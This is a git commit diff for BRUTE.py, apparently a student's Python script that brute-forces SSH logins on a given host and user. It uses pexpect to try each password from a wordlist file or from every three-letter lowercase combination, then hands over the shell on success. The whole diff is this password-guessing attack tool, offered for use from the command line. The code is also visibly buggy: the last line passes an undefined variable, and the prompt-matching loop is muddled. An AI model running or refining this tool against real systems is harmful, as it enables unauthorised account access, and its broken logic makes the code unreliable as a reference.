481d105f648bb8c86dd540160bdfab5c7bb67dd3
Luke Freeman <lfreeman6490@gmail.com>
2020-05-22 18:48:47 -0500

    Update BRUTE.py

--- BRUTE.py
+++ BRUTE.py
@@ -1,6 +1,4 @@
 #!/usr/bin/python3
-#recommended code structure
-
 import pexpect
 import sys
 
@@ -15,41 +13,58 @@ def tryLogIn(user,host,password,passwordList):
 	print(connStr)
 	#spawn the ssh process
 	child = pexpect.spawn(connStr)
-	for password in passwordList:
-		print("password = ", password)
-	#wait until we see password promt
-		returnCode = child.expect(["user","password:"])
+	i = 0
+	while i < len(passwordList):
+		password = (passwordList[i])
+		i = i + 1
+		#wait until we see password promt
+		returnCode = child.expect(["password"])
 		if returnCode == 0:
-		#send the password
+			#send the password
 			child.sendline(password)
-		returnCode2 = child.expect(["\$", "try",pexpect.EOF])
-		if returnCode2 == 0:
-			print("we're in...password was ",password)
+		returnCode = child.expect(["\$", "try",pexpect.EOF])
+		if returnCode == 0:
 			child.sendline()
 			child.interact() #returns to user
 			sys.exit(0)
-		elif returnCode2 == 1:
-			print("password was incorrect")
+		elif returnCode == 1:
 			child.sendline()
-		elif returnCode2 == 2:
+		elif returnCode == 2:
 			child = pexpect.spawn(connStr)
 		else:
-			print("here")
-	print("no more passwords")
+			print("no more passwords")
 	#if we get this far it succeeded
 	#instead of giving up if it doesn't get it, it should keep on trying, and go on and on forever until it's let it. stay in same list of passwords 
 	#gonna change password to listOfPasswords in top of function
 
-#have to initialze
+listOfPasswords = [] #have to initialze
 #pulled from a program from programming fundamentals
 def getPasswordFromFile(textFile):
 	passwordList = []	
 	file = textFile
 	with open(textFile) as textFile:
 		passwordList = textFile.read().splitlines()
+	print(passwordList)
 	return passwordList
 
 def getPasswordUsingLetters():
 	passwordList = []
 	letters = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
 	for first in letters:
+		for second in letters:
+			for third in letters:
+				passwordList.append(first+second+third)
+	print(passwordList)
+	return passwordList		
+
+#################################################################################################
+if sys.argv[1] == "-g":
+	host = sys.argv[2]
+	user = sys.argv[3]
+	passwordList = getPasswordUsingLetters()
+elif sys.argv[1] == "-f":
+	textFile = sys.argv[2]
+	host = sys.argv[3]
+	user = sys.argv[4]
+	passwordList = getPasswordFromFile(textFile)
+tryLogIn(user,host,password,passwordList)
